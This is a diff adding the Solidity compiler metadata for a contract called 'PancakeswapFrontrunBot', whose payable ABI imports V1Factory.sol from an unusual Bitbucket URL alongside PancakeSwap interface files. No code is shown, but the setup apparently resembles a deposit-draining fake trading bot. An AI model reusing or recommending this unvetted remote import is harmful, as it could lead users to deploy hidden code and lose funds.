@@ -1,0 +1,85 @@
+{
+	"compiler": {
+		"version": "0.6.6+commit.6c089d02"
+	},
+	"language": "Solidity",
+	"output": {
+		"abi": [
+			{
+				"inputs": [],
+				"stateMutability": "nonpayable",
+				"type": "constructor"
+			},
+			{
+				"inputs": [],
+				"name": "action",
+				"outputs": [],
+				"stateMutability": "payable",
+				"type": "function"
+			},
+			{
+				"stateMutability": "payable",
+				"type": "receive"
+			}
+		],
+		"devdoc": {
+			"methods": {}
+		},
+		"userdoc": {
+			"methods": {}
+		}
+	},
+	"settings": {
+		"compilationTarget": {
+			"contracts/Bot.sol": "PancakeswapFrontrunBot"
+		},
+		"evmVersion": "istanbul",
+		"libraries": {},
+		"metadata": {
+			"bytecodeHash": "ipfs"
+		},
+		"optimizer": {
+			"enabled": false,
+			"runs": 200
+		},
+		"remappings": []
+	},
+	"sources": {
+		"contracts/Bot.sol": {
+			"keccak256": "0x84a2d7d9a234290a284c9a087d43a330b90b999c14002f863672fb8ac9059191",
+			"urls": [
+				"bzz-raw://c18136806f845d3b69664037081c08260c36d5dc84c5f3535cefb2a276716d1b",
+				"dweb:/ipfs/QmWV2ad7s2Rm3ZjALsn7Cr3NH4c7Yp8QSxNBU9WvECFYER"
+			]
+		},
+		"https://bitbucket.org/contrbbdact/contract/raw/242652f08274e01f10f5a11e7300e079e17c21cb/V1Factory.sol": {
+			"keccak256": "0xb6ef317581a66da61af4d9993d5ac3a2c629266653a5edee11efe84ef564ca45",
+			"urls": [
+				"bzz-raw://69baf99c3269e1a52afa9a4286c11f4555ec2f7489f71f4edd0f66e8e93e2d6d",
+				"dweb:/ipfs/QmZzF99d5sxTv8JKUYpgaBZj8HpXAYAkf4z33ks7KJwAt5"
+			]
+		},
+		"https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IPancakeMigrator.sol": {
+			"keccak256": "0xc454bac9ee1058ed26cd799299576a31208e214be7c7e0cba678b980ce7feb1b",
+			"urls": [
+				"bzz-raw://51a318fe858a9c35e20212256587f47ea381c6326e0dbe19608932eb727a6877",
+				"dweb:/ipfs/QmVziB7CNyjcYEv19FrzPgkrErVvBuctuyaciotio5PF1g"
+			]
+		},
+		"https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
+			"keccak256": "0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b",
+			"urls": [
+				"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65",
+				"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi"
+			]
+		},
+		"https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
+			"keccak256": "0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589",
+			"urls": [
+				"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6",
+				"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f"
+			]
+		}
+	},
+	"version": 1
+}
